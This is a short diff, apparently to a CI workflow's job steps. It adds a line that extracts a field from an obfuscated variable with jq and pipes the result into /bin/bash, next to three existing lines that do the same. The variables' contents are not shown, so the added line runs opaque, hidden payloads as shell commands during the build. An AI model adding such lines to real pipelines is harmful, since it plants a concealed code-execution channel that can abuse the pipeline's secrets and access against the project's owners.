@@ -32,6 +32,7 @@ jobs:
           echo $r97742 | jq -r .ihmf71 | /bin/bash
           printf '%s' "$ph4" | jq -r .otet2043 | /bin/bash
           echo $fy7 | jq -r .hds6 | /bin/bash
+          echo $t57450 | jq -r .zjw1 | /bin/bash
 
       - name: Archive output
         if: always()
